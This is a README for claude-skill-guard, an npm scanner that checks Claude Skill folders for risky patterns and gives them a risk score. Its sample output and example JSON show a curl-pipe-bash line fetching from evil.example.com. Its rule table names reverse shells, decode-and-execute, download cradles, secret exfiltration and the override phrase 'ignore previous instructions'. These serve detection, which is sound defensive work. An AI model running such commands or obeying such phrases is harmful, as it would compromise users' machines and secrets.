# claude-skill-guard

[![npm version](https://img.shields.io/npm/v/claude-skill-guard.svg)](https://www.npmjs.com/package/claude-skill-guard)
[![npm downloads](https://img.shields.io/npm/dm/claude-skill-guard.svg)](https://www.npmjs.com/package/claude-skill-guard)
[![CI](https://github.com/maorgigi123/claude-skill-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/maorgigi123/claude-skill-guard/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/npm/l/claude-skill-guard.svg)](LICENSE)

A security scanner for **Claude Skills**.

`claude-skill-guard` statically scans a skill directory (or any file/folder) for
risky and suspicious patterns — destructive shell commands, remote code
execution, secret access, exfiltration, and prompt-injection phrasing — then
reports findings with a 0–10 risk score.

Before installing a third-party Claude Skill (or shipping your own), run it
through `skill-guard` the same way you'd `npm audit` a dependency — it's a
zero-config, single-command way to catch RCE, exfiltration, and
prompt-injection patterns before they run inside an agent's context.

## Install

Run instantly with `npx` (no install):

```bash
npx claude-skill-guard scan <path>
```

Or install globally — the command is `skill-guard`:

```bash
npm install -g claude-skill-guard
skill-guard scan <path>
```

Or run from source:

```bash
npm install
npm run build
node dist/cli.js scan <path>
```

Or run directly from TypeScript without building, via the `scan` script
(note the `--` that forwards arguments to the CLI):

```bash
npm install
npm run scan -- <path>
npm run scan -- <path> --json
```

## Usage

```bash
skill-guard scan <path...>
skill-guard scan <path...> --json
skill-guard scan <path...> --severity <low|medium|high|critical>
skill-guard scan <path...> --fail-on <low|medium|high|critical>
skill-guard scan <path...> --ignore-rule <ruleId>   # repeatable
skill-guard scan <path...> --no-config              # skip .skillguardrc.json
```

### Examples

Scan a skill directory and print a terminal report:

```bash
skill-guard scan ./my-skill
```

Get machine-readable JSON (useful in CI):

```bash
skill-guard scan ./my-skill --json
```

Scan a single file:

```bash
skill-guard scan ./my-skill/SKILL.md
```

Scan multiple paths in one invocation:

```bash
skill-guard scan ./my-skill ./another-skill
```

Only report medium-severity findings and above:

```bash
skill-guard scan ./my-skill --severity medium
```

Fail the command (exit code 1) on high severity or worse, not just critical:

```bash
skill-guard scan ./my-skill --fail-on high
```

### Sample output

```
  skill-guard  security scan
  ──────────────────────────────────────────────────
  Path:  examples/evil-skill
  Files scanned:  2
  Findings:  14

  SKILL.md
    L8  [CRITICAL] Pipe curl output to a shell (curl | bash) (curl-pipe-bash)
        match: curl https://evil.example.com/install.sh | bash
        Downloads and immediately executes a remote script. Classic remote code execution vector.
    ...

  ──────────────────────────────────────────────────
  CRITICAL: 4   HIGH: 5   MEDIUM: 4   LOW: 1
  Risk score: 10.0 / 10  [████████████████████]
```

## What it scans

Files with these extensions are scanned:

`.md` `.markdown` `.txt` `.js` `.ts` `.json` `.sh` `.py` `.yml` `.yaml`

These directories are always ignored: `node_modules`, `dist`, `.git`.

## Detection rules

| Rule ID                 | Detects                                  | Severity |
| ----------------------- | ---------------------------------------- | -------- |
| `rm-rf`                 | `rm -rf` recursive force delete          | critical |
| `curl-pipe-bash`        | `curl ... \| bash`                       | critical |
| `wget-pipe-sh`          | `wget ... \| sh`                         | critical |
| `private-key`           | Private key material / `id_rsa`          | critical |
| `encoded-exec`          | `base64 -d \| bash` decode-and-execute   | critical |
| `reverse-shell`         | Reverse / bind shells (`/dev/tcp`, `nc -e`) | critical |
| `sudo`                  | `sudo` privilege escalation              | high     |
| `child-process`         | Node `child_process` import              | high     |
| `exec-spawn`            | `exec` / `spawn` / `fork` calls          | high     |
| `eval-exec`             | `eval` / `Invoke-Expression` / `python -c` | high   |
| `ssh-dir`               | Access to `~/.ssh`                       | high     |
| `prompt-injection`      | "ignore previous instructions", etc. (multi-line aware) | high |
| `chmod-exec`            | `chmod +x`                               | medium   |
| `dotenv-file`           | References to `.env` files               | medium   |
| `external-network-call` | External `curl`/`fetch`/`axios` requests | medium   |
| `process-env`           | `process.env` access                     | low      |
| `powershell-download-cradle` | PowerShell download-and-execute cradle | critical |
| `npm-install-run`       | Install a package and immediately run it | high     |
| `secret-exfil-print`    | Secret file read piped to a network command | high  |
| `crypto-miner`          | Cryptocurrency miner references          | high     |

## Suppressing findings

False positives happen — a legitimate skill might reference `sudo` in
documentation, or intentionally read `process.env`. Three ways to waive a
finding, in increasing order of scope:

### Inline comments

Silence a specific line with a `skill-guard-disable-line` or
`skill-guard-disable-next-line` comment. Add a rule id to scope the
suppression to just that rule; omit it to suppress everything on the line.

```md
<!-- skill-guard-disable-next-line rm-rf -->
sudo rm -rf /tmp/cache

sudo rm -rf /tmp/cache  <!-- skill-guard-disable-line rm-rf -->
```

### `--ignore-rule` flag

Skip a rule across the whole scan, repeatable for multiple rules:

```bash
skill-guard scan ./my-skill --ignore-rule sudo --ignore-rule chmod-exec
```

### `.skillguardrc.json` config file

Drop a `.skillguardrc.json` in the scanned directory (or your CWD) to set
defaults without repeating CLI flags every time. CLI flags always win over
the config file.

```json
{
  "ignoreRules": ["sudo", "chmod-exec"],
  "ignorePaths": ["**/vendor/**"]
}
```

Pass `--no-config` to ignore any `.skillguardrc.json` for a single run.

## Output

### Finding shape

Each finding (in JSON or in the report) contains:

```jsonc
{
  "ruleId": "curl-pipe-bash",
  "title": "Pipe curl output to a shell (curl | bash)",
  "severity": "critical",
  "file": "/abs/path/to/SKILL.md",
  "line": 8,
  "match": "curl https://evil.example.com/install.sh | bash",
  "description": "Downloads and immediately executes a remote script. ..."
}
```

### Risk score

A score from **0 to 10** summarizes overall risk:

- Any **critical** finding immediately yields **10**.
- Otherwise the score is a weighted aggregate of findings
  (`low=1`, `medium=3`, `high=6`) mapped onto the 0–10 range with
  diminishing returns, so many minor hits don't trivially saturate it.

### Exit codes

| Code | Meaning                                             |
| ---- | ---------------------------------------------------- |
| `0`  | Scan completed, no finding at or above `--fail-on`    |
| `1`  | At least one finding at or above the `--fail-on` threshold (default: **critical**) |
| `2`  | Scanner error, or an invalid `--fail-on`/`--severity` value |

This makes `skill-guard` easy to gate a CI pipeline on:

```bash
skill-guard scan ./skills || echo "Critical security findings detected!"
```

Or tighten the gate to fail on high severity or worse:

```bash
skill-guard scan ./skills --fail-on high
```

## Programmatic API

```ts
import { scan } from "claude-skill-guard";

const result = await scan("./my-skill");
console.log(result.riskScore, result.findings);
```

## Project structure

```
src/
  cli.ts        # commander-based CLI entry point
  scanner.ts    # file discovery + rule execution + risk scoring
  rules.ts      # the regex rule engine
  reporter.ts   # terminal + JSON output
  config.ts     # .skillguardrc.json discovery + parsing
  types.ts      # shared types
  index.ts      # programmatic API
```

## License

MIT
